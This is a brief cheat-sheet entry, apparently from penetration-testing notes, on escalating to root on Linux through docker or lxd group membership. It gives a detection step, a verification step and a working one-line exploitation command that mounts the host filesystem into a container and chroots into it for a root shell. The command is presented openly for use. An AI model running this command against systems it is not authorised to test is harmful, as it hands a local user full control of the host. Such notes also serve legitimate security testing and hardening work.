# Docker / LXC Privilege Escalation

## Detection

id

Look for docker or lxd group membership.

## Exploitation

docker run -v /:/mnt --rm -it alpine chroot /mnt sh

## Verification

whoami
